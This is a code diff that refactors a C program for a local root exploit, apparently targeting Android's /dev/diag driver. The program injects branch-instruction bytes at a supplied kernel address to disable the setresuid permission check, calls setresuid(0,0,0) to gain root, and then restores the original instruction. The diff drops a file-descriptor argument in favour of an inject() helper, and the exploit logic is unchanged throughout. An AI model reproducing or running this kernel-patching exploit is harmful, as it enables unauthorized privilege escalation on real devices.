@@ -75,33 +75,29 @@ detect_injection_addresses(diag_injection_addresses *injection_addresses)
 
 static bool
 inject_command(const char *command,
-               diag_injection_addresses *injection_addresses,
-               int fd)
+               diag_injection_addresses *injection_addresses)
 {
   struct values injection_data;
 
   injection_data.address = injection_addresses->target_address;
   injection_data.value = command[0] | (command[1] << 8);
 
-  return inject_with_file_descriptor(&injection_data, 1,
-                                     injection_addresses->delayed_rsp_id_address,
-                                     fd) == 0;
+  return inject(&injection_data, 1,
+                injection_addresses->delayed_rsp_id_address) == 0;
 }
 
 static bool
-break_sys_setresuid(diag_injection_addresses *injection_addresses,
-                    int fd)
+break_sys_setresuid(diag_injection_addresses *injection_addresses)
 {
   const char beq[] = { 0x00, 0x0a };
-  return inject_command(beq, injection_addresses, fd);
+  return inject_command(beq, injection_addresses);
 }
 
 static bool
-restore_sys_setresuid(diag_injection_addresses *injection_addresses,
-                      int fd)
+restore_sys_setresuid(diag_injection_addresses *injection_addresses)
 {
   const char bne[] = { 0x00, 0x1a };
-  return inject_command(bne, injection_addresses, fd);
+  return inject_command(bne, injection_addresses);
 }
 
 static void
@@ -114,7 +110,6 @@ usage(void)
 int
 main(int argc, char **argv)
 {
-  int fd;
   int ret;
   diag_injection_addresses injection_addresses;
 
@@ -128,21 +123,13 @@ main(int argc, char **argv)
     injection_addresses.delayed_rsp_id_address = strtoul(argv[2], NULL, 16);
   }
 
-  fd = open("/dev/diag", O_RDWR);
-  if (fd < 0) {
-    printf("failed to open /dev/diag due to %s.", strerror(errno));
-    exit(EXIT_FAILURE);
-  }
-
-  ret = break_sys_setresuid(&injection_addresses, fd);
+  ret = break_sys_setresuid(&injection_addresses);
   if (ret < 0) {
-    close(fd);
     exit(EXIT_FAILURE);
   }
 
   ret = setresuid(0, 0, 0);
-  restore_sys_setresuid(&injection_addresses, fd);
-  close(fd);
+  restore_sys_setresuid(&injection_addresses);
 
   if (ret < 0) {
     printf("failed to get root access\n");
